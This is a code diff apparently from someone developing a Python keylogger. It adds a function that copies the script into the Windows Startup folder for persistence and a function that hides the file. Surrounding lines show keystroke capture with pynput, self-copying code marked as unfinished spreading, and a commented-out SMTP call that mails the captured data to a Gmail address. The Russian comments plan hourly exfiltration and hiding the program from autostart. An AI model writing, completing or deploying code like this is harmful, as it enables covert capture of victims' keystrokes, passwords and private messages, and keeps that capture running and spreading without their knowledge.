@@ -3,15 +3,16 @@
 try:
     import schedule
     from pynput import keyboard
+    import win32con, win32api
     import smtplib
     import email
     import email.mime.application
     from email.mime.multipart import MIMEMultipart
     from pynput.keyboard import Key, Listener
-    import os, sys, time, uuid
+    import os,   sys, time, uuid
 except ModuleNotFoundError:
     from subprocess import call
-    packets = ["pynput", "smtplib", "email", "schedule"]
+    packets = ["pynput", "smtplib", "email", "schedule", "win32con", "win32api"]
     call("pip install" + ' '.join(packets), shell=True)
 finally:
 
@@ -55,9 +56,18 @@ finally:
         if key == keyboard.Key.esc:
             return False
 
-    # скрытая работа, запуск  ok поебись с батниками и тп
-    # автозапуск при загрузке пк(прятать из загрузки) сделать файл скрытым
+    def startup():
+        keylogger = sys.argv[0]
+        keylogger_name = os.path.basename(keylogger)
+        user_path = os.path.expanduser('~')
+
+        if not os.path.exists(
+                f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{keylogger_name}"):
+            os.system(
+                f'copy "{keylogger}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
+
     # подумай над shedule каждый час отправлять данные
+
     with keyboard.Listener(
             on_press=on_press,
             on_release=on_release) as listener:
@@ -66,10 +76,6 @@ finally:
         on_press=on_press,
         on_release=on_release)
     listener.start()
-        # DELETE THIS!!!!
-    for i in range(len(pressedkeys)):
-        print(pressedkeys[i])
-        # DELETE THIS!!!!
 
     with open(sys.argv[0]) as file:
         self_content = file.read()
@@ -90,7 +96,14 @@ finally:
             # os.chmod(dupe, "0777"))
             os.system("./%s &" % dupe) #доделать расспространение
 
+    def invisibility():
+        win32api.SetFileAttributes(sys.argv[0], win32con.FILE_ATTRIBUTE_HIDDEN)
+
+    def visibility(): # DELETE BEFORE PUSHING
+        win32api.SetFileAttributes(sys.argv[0], win32con.FILE_ATTRIBUTE_NORMAL)
     if __name__ == '__main__':
+        # startup()
+        # invisibility()
+        visibility()
         # server.sendmail('cnxnd11@gmail.com', ['cnxnd11@gmail.com'], msg.as_string())
         # server.quit()
-        pass
